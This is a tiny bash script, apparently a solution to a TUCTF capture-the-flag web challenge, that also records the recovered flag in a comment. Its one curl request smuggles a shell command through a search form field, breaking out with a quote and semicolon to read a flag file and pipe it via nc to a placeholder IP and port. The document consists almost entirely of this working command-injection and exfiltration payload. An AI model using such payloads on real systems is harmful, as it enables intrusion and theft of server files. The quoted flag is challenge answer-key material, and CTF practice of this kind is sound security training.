#!/bin/bash

curl 'http://iframeshame.tuctf.com/' --data 'search=" ; cat flag | nc <ip> <port> ; "&Submit=Submit+Query'

#flag was TUCTF{D0nt_Th1nk_H4x0r$_C4nt_3sc4p3_Y0ur_Pr0t3ct10ns}
